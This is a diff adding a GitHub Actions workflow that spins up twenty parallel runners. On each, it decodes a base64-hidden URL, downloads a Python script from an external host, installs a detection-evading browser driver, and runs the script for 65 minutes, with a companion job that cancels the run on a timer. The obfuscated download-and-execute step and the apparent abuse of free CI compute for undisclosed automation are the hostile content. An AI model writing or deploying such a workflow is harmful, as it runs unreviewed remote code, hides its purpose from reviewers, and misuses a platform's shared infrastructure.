@@ -1,0 +1,107 @@
+name: Linux Citadel Task Guard
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: citadel-guard-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مسؤول الإبطال الحاسم: يُنهي سير العمل بالكامل عند علامة 65 دقيقة
+  # =================================================================
+  decisive-cancellation-officer:
+    name: "Decisive Cancellation Officer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Serve Ultimate Cancellation Notice
+        run: |
+          echo "[OFFICER] Decisive cancellation officer on station. Ultimate cancellation armed at the 65-minute spark."
+          echo "[OFFICER] Reading workflow sigil: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[OFFICER] Spark ignited! Serving ultimate cancellation notice..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[OFFICER] Ultimate cancellation notice served. All engaged and queued units will be cancelled."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات القلعة
+  # =================================================================
+  garrison-citadel:
+    name: "CitadelUnit-${{ matrix.unit_marker }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_marker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # ⌘ الخطوة (١): تسوية الأرضية التحتية
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Level Underlying Ground
+        run: |
+          echo "[LEVEL] Leveling underlying ground for CitadelUnit-${{ matrix.unit_marker }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # ⌘ الخطوة (٢): استنزال الرقيم التنفيذي
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Bring Down Executive Scroll
+        run: |
+          echo "[BRINGDOWN] Bringing down app_task.py from assigned repository coffer..."
+          REPOSITORY_COFFER=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$REPOSITORY_COFFER" -o app_task.py
+          echo "[BRINGDOWN] Executive scroll brought down."
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # ⌘ الخطوة (٣): رصف الحزم المساندة
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Lay Supporting Bundles
+        run: |
+          echo "[LAY] Laying supporting bundles..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      # ⌘ الخطوة (٤): التنفيذ المضبوط بالمدة (65 دقيقة)
+      # ✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+      - name: Trigger Regulated Operation
+        run: |
+          echo ">> Garrisoning CitadelUnit-${{ matrix.unit_marker }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          CITADEL_PID=$!
+          
+          echo ">> Regulated operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $CITADEL_PID 2>/dev/null; then
+            echo ">> Regulated window elapsed! Retiring operation..."
+            kill -9 $CITADEL_PID
+            echo ">> Operation retired by regulation keeper."
+          else
+            echo ">> Operation completed within regulated window."
+          fi
